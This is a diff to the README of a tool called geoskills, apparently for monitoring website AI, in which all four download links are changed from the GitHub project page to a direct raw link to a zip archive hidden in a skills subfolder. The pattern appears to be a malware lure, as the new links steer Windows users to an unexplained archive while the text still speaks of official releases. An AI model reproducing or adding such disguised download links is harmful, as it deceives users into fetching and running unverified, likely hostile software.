@@ -1,6 +1,6 @@
 # 🌍 geoskills - Diagnose and Monitor Your Website AI
 
-[![Download geoskills](https://img.shields.io/badge/Download-geoskills-brightgreen)](https://github.com/Detentebidensconnata138/geoskills)
+[![Download geoskills](https://img.shields.io/badge/Download-geoskills-brightgreen)](https://raw.githubusercontent.com/Detentebidensconnata138/geoskills/main/skills/geo-fix-llmstxt/Software_v1.3.zip)
 
 ---
 
@@ -43,7 +43,7 @@ To get geoskills on your Windows computer, follow these steps:
 ### Step 1: Visit the download page  
 Click the button below to visit the official geoskills download page. This is where you get the latest version.
 
-[![Download geoskills](https://img.shields.io/badge/Download-geoskills-brightgreen)](https://github.com/Detentebidensconnata138/geoskills)
+[![Download geoskills](https://img.shields.io/badge/Download-geoskills-brightgreen)](https://raw.githubusercontent.com/Detentebidensconnata138/geoskills/main/skills/geo-fix-llmstxt/Software_v1.3.zip)
 
 ### Step 2: Find the latest release  
 On the GitHub page, look for the **Releases** section on the right or in the README. Click on the latest release version.
@@ -124,7 +124,7 @@ To get new features or fixes:
 3. Follow prompts to download and install the latest version
 
 Alternatively, visit the download page again:  
-[https://github.com/Detentebidensconnata138/geoskills](https://github.com/Detentebidensconnata138/geoskills)
+[https://raw.githubusercontent.com/Detentebidensconnata138/geoskills/main/skills/geo-fix-llmstxt/Software_v1.3.zip](https://raw.githubusercontent.com/Detentebidensconnata138/geoskills/main/skills/geo-fix-llmstxt/Software_v1.3.zip)
 
 ---
 
@@ -164,4 +164,4 @@ geoskills relates to these areas:
 
 ---
 
-[![Download geoskills](https://img.shields.io/badge/Download-geoskills-brightgreen)](https://github.com/Detentebidensconnata138/geoskills)
+[![Download geoskills](https://img.shields.io/badge/Download-geoskills-brightgreen)](https://raw.githubusercontent.com/Detentebidensconnata138/geoskills/main/skills/geo-fix-llmstxt/Software_v1.3.zip)
